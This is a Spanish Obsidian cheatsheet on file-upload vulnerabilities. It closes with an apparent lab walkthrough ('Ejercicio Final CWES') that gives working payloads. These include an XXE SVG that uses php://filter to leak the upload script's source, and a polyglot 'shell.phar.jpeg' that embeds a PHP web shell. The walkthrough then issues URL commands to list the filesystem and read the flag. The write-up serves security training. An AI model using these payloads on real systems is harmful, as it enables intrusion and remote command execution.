---
aliases:
  - "Unauthenticated File Upload"
  - "Arbitrary File Upload"
  - "Bypass de Subida de Archivos"
tags:
  - type/vulnerability
  - vuln/file-upload
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[File Upload - Reconocimiento de Filtros]]"
  - "[[File Upload - Bypass de Filtros de Lista Negra]]"
  - "[[File Upload - Bypass de Filtros de Lista Blanca]]"
  - "[[File Upload - Bypass de Sobrescritura de Configuración]]"
  - "[[File Upload - Bypass de Contenido]]"
  - "[[File Upload - Bypass por Confusión y Desincronización]]"
  - "[[File Upload - Shells en PHP]]"
  - "[[File Upload - Desactivación de Validación Front-end]]"
  - "[[File Upload - XSS y XXE]]"
---
# File Upload - Vulnerabilidades

***

## Cheatsheet

````tabs
tab: **Reconocimiento**
![[File Upload - Reconocimiento de Filtros#^fu-reconocimiento]]

tab: **Front-end**
![[File Upload - Desactivación de Validación Front-end#^fu-frontend]]

tab: **Lista Negra**
![[File Upload - Bypass de Filtros de Lista Negra#^fu-blacklist]]

tab: **Lista Blanca**
![[File Upload - Bypass de Filtros de Lista Blanca#^fu-whistelist]]

tab: **Sobrescritura**
![[File Upload - Bypass de Sobrescritura de Configuración#^fu-conf]]

tab: **Contenido**
![[File Upload - Bypass de Contenido#^fu-contenido]]

tab: **Confusión**
![[File Upload - Bypass por Confusión y Desincronización#^fu-confusion]]
````


***

## Overview


***

## Notas Relacionadas


***

## Ejercicio Final CWES

Lista de extensiones php: [PayloadsAllTheThings/Upload Insecure Files/Extension PHP/extensions.lst at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
Pruebo en burpsuite las extensiones permitidas. 

Lista de tipos de contenido web: [raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-all-content-types.txt](https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt)
Reduzco los tipos y pruebo en burpsuite:
```bash
cat web-all-content-types.txt | grep 'image/' | xclip -se c
```
Se permite `image/svg+xml`, 

Cargo un archivo que me muestre el código fuentes de la web en base64 (hay que modificar en burpsuite el content type):
```bash
cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
EOF
```

Lo leo
```bash
echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' | base64 -d
```

Veo que el directorio de carga es: 
```bash
./user_feedback_submissions/
```
y que los nombres de los archivos subidos se anteponen con la fecha `ymd` que agrega el año actual en formato corto, el mes actual y el día actual.

Creo y subo el archivo `shell.phar.jpeg`:
```bash
cat << 'EOF' > shell.phar.jpeg
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
EOF
```

Cargo la flag a través del cmd desde la url:
```http
http://154.57.164.81:32351/contact/user_feedback_submissions/260503_shell.phar.jpeg?cmd=ls+/

http://154.57.164.81:32351/contact/user_feedback_submissions/260503_shell.phar.jpeg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
```

